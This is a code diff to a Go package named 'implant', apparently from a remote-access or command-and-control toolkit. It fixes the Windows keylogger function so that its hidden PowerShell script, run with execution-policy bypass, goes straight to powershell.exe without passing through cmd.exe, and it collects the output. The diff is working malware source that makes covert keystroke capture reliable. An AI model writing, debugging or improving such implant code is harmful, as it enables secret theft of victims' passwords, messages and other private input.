@@ -1,7 +1,10 @@
 package implant
 
 import (
+	"bytes"
+	"context"
 	"fmt"
+	"os/exec"
 	"runtime"
 	"time"
 )
@@ -39,7 +42,30 @@ func keylogWindows(durationSec int) ([]byte, error) {
 		"default{$log+=[char]::ToLower([char]$i)} } } }; Start-Sleep -Milliseconds 10 }; Write-Output $log",
 		durationSec)
 
-	return ExecuteShell([]string{"powershell", "-ep", "bypass", "-w", "hidden", "-c", ps})
+	// Invoke powershell.exe directly — DO NOT pipe through ExecuteShell,
+	// which wraps everything in `cmd.exe /S /C "..."`. The embedded
+	// PowerShell script contains a `|` (the `|Out-Null` for GetWindowText)
+	// which cmd.exe parses as a *cmd* pipe before PowerShell ever sees it,
+	// producing the bogus `'Out-Null' is not recognized as an internal or
+	// external command` error. exec.Command passes args directly without
+	// going through a shell.
+	ctx, cancel := context.WithTimeout(context.Background(), shellTimeout)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, "powershell.exe", "-ep", "bypass", "-w", "hidden", "-c", ps)
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+	if err := cmd.Run(); err != nil && stdout.Len() == 0 && stderr.Len() == 0 {
+		return nil, err
+	}
+	out := stdout.Bytes()
+	if stderr.Len() > 0 {
+		if len(out) > 0 {
+			out = append(out, '\n')
+		}
+		out = append(out, stderr.Bytes()...)
+	}
+	return out, nil
 }
 
 func keylogLinux(durationSec int) ([]byte, error) {
